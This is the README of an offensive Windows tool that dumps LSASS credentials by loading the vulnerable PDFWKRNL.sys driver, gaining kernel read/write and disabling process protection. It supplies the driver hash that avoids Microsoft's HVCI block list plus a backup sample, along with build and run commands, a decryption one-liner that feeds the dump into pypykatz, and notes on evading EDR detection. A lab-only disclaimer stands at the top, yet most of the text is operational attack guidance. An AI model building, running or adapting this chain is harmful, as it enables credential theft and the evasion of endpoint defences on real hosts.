# byovd-lsass-dump

> Authorised lab / red-team use only. Do not run on hosts you do not own
> or do not have written authorisation to test against.

BYOVD LSASS dumper built around **PDFWKRNL.sys** (AMD USB-C Power Delivery
Firmware Update Utility Driver), IOCTL `0x80002014` — an arbitrary-kernel
`memmove` primitive that gives user-mode admin a kernel R/W gadget.

Chain in `src/main.c`:

```
load PDFWKRNL.sys (SCM)
  → open \\.\PDFWKRNL
  → kw_kernel_base("ntoskrnl.exe")           (sanity)
  → kw_find_eprocess(self PID)               (SystemExtendedHandleInformation)
  → ppl_read_protection(self)                (save byte at +0x5FA)
  → ppl_disable_for_self(self)               (write 0x00 to +0x5FA)
  → pc_enable_se_debug
  → pc_clone_lsass                           (NtCreateProcessEx fork)
  → md_dump_to_memory(clone)                 (MiniDumpWithFullMemory → heap)
  → out_write_obfusc(buf, 0x55, path)        (XOR + WriteFile)
  → ppl_restore_for_self                     (undo)
  → drv_unregister_and_stop
```

## Sample selection

See `driver-recon/SAMPLES.md`. Use sample #4:

```
SHA256:        6945077a6846af3e4e2f6a2f533702f57e993c5b156b6965a552d6a5d63b7402
Authentihash:  661a1a28950cec3f2c3d0e72ab2a05d4a173cf9a   (NOT in MS HVCI block list)
```

Backup if blocked in a future MS update: sample #3 (distinct Authentihash,
same vuln). Samples #2 and #5 ARE in the block list — do not ship them.

## Build (cross-compile from Linux)

```bash
sudo apt install mingw-w64
make
# → build/byovd_lsass_dump.exe (≈ 54 KB stripped)
```

## Run (on the lab Win11 box)

Requires:
- Admin shell (driver load + SeDebugPrivilege).
- HVCI off OR a driver whose Authentihash is not in the active block list
  (sample #4 satisfies the May 2026 list).
- Test Signing OR a properly signed driver (sample #4 keeps its AMD sig).

```cmd
byovd_lsass_dump.exe C:\Tools\PDFWKRNL.sys C:\Users\Public\dump.bin
```

Output: XOR'd minidump at `C:\Users\Public\dump.bin`.

## Decrypt the dump (offline, your workstation)

```bash
python3 -c "
import sys; b=open(sys.argv[1],'rb').read()
open(sys.argv[2],'wb').write(bytes(c^0x55 for c in b))
" dump.bin lsass.dmp

# Verify
file lsass.dmp     # → 'Mini DuMP crash report'
pypykatz lsa minidump lsass.dmp
```

## Target build

Win11 22H2 / 23H2 Build 26200 (default `EPROCESS` offsets in `src/common.h`).
For other builds, recompile with `-DEPROCESS_PROTECTION_OFFSET=0xNNN` etc.

## What's stealth and what's not

Stealthy:
- Process clone instead of touching LSASS handle directly.
- In-memory minidump (`MINIDUMP_CALLBACK_INFORMATION`), no disk file with
  `MDMP` magic.
- XOR-0x55 obfuscation of disk output.

Not yet:
- SCM-based driver load is logged in Event Log Application 7045. Enable
  `DRV_LOAD_VIA_NTLOAD=1` once `drv_register_via_ntload` is implemented
  (TODO in `driver_loader.c`).
- Static PE has unique strings — no obfuscation pass over the binary
  itself yet.
- Restore step writes the original byte back but the moment we wrote 0x00
  is observable to any callback hooking `PspProtectedProc*` paths.

## Files

```
src/common.h              types, NT prototypes, EPROCESS offsets
src/driver_loader.c       SCM register + start + open device
src/driver_io.c           IOCTL 0x80002014 wrappers (memcpy / read / write)
src/kernel_walker.c       kernel modules + EPROCESS via SystemExtendedHandleInformation
src/ppl_disable.c         read / write / restore EPROCESS.Protection
src/process_clone.c       SeDebug + NtCreateProcessEx clone of LSASS
src/minidump_inmemory.c   MiniDumpWriteDump with heap-streaming callback
src/xor_obfusc.c          byte-wise XOR
src/output.c              XOR + WriteFile to disk
src/main.c                chain orchestration
Makefile                  MinGW-w64 cross-compile
driver-recon/SAMPLES.md   PDFWKRNL.sys hash-by-hash HVCI status
```

## References

- g3tsyst3m, "BYOVD and Looting LSASS in the Modern EDR Era"
- loldrivers.io entries for PDFWKRNL.sys
- MS HVCI vulnerable driver block list (`aka.ms/VulnerableDriverBlockList`)
